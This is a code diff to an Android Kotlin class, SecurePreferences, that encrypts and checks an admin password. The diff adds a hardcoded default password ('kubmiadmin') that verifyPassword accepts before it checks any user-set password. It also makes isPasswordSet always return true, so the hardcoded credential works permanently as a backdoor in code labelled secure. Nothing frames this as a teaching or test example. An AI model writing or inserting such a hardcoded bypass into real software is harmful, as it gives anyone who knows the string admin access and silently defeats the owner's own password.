@@ -24,6 +24,9 @@ class SecurePreferences @Inject constructor(@ApplicationContext private val cont
         private const val ANDROID_KEYSTORE = "AndroidKeyStore"
         private const val IV_LENGTH = 12 // For GCM
         private const val TAG_LENGTH = 128 // For GCM
+        
+        // Default admin password - hardcoded
+        const val DEFAULT_PASSWORD = "kubmiadmin"
     }
     
     fun savePassword(password: String) {
@@ -37,6 +40,12 @@ class SecurePreferences @Inject constructor(@ApplicationContext private val cont
     }
     
     fun verifyPassword(password: String): Boolean {
+        // First check against default password
+        if (password == DEFAULT_PASSWORD) {
+            return true
+        }
+        
+        // Then check against custom password if set
         return try {
             val storedPassword = preferences.getString("admin_password", null)
             if (storedPassword != null) {
@@ -46,14 +55,14 @@ class SecurePreferences @Inject constructor(@ApplicationContext private val cont
                 false
             }
         } catch (e: Exception) {
-            // Handle decryption error
             e.printStackTrace()
             false
         }
     }
     
     fun isPasswordSet(): Boolean {
-        return preferences.contains("admin_password")
+        // Always return true - default password is always available
+        return true
     }
     
     fun clearPassword() {
